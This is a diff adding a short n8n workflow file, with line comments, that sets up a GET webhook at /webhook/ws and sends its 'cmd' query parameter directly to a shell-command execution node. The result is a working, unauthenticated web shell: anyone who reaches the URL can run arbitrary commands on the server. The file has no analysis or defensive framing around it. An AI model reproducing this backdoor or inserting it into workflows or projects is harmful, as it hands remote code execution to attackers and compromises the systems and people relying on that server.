@@ -1,0 +1,34 @@
+{
+  "name": "ws",                        // workflow name
+  "nodes": [                           // node lists
+    {
+      "parameters": {                  // the node config
+        "httpMethod": "GET",           //   webhook receive GET
+        "path": "ws",                  //   URL is /webhook/ws
+        "responseMode": "onReceived"   //  
+      },
+      "name": "Webhook",               // node name
+      "type": "n8n-nodes-base.webhook",// node type
+      "typeVersion": 1,
+      "position": [250, 300],          
+      "webhookId": "ws"
+    },
+    {
+      "parameters": {
+        "command": "={{ $json.query.cmd }}"  // command will run (expression)
+      },
+      "name": "Exec",
+      "type": "n8n-nodes-base.executeCommand",// node type, node run shell command
+      "typeVersion": 1,
+      "position": [500, 300]
+    }
+  ],
+  "connections": {                     // connection between these two nodes
+    "Webhook": {                       // from node "Webhook"
+      "main": [[                       // main flow
+        { "node": "Exec", "type": "main", "index": 0 }  // To node "Exec"
+      ]]
+    }
+  },
+  "settings": {}
+}
